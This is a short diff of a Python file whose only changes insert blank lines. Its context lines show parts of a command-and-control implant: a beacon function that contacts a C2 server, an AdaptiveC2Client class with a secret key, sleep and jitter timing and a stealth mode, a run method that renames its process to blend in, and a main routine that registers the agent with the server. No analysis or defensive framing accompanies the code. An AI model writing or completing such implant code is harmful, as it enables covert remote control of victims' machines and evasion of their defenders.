@@ -243,6 +243,7 @@ def send_message(endpoint, message="", oldStatus=True, newStatus=True,
         print_debug(f"send_message({url}): Beacon error: {e}")
     return False, ""
 
+
 class AdaptiveC2Client:
     def __init__(self, c2_server, secret_key, sleep_time=60, jitter=20, stealth_mode=False):
         self.c2_server = c2_server
@@ -448,6 +449,7 @@ class AdaptiveC2Client:
         except Exception as e:
             return None
     
+    
     def run(self):
         # Change process name to blend in
         try:
@@ -512,6 +514,7 @@ class AdaptiveC2Client:
 
 # Integration with the existing code
 def main():
+
     STEALTH_MODE = True
     # Perform our initial connection to the server to setup the agent
     status, response = send_message("agent/beacon", "register", stealth_mode=STEALTH_MODE)    
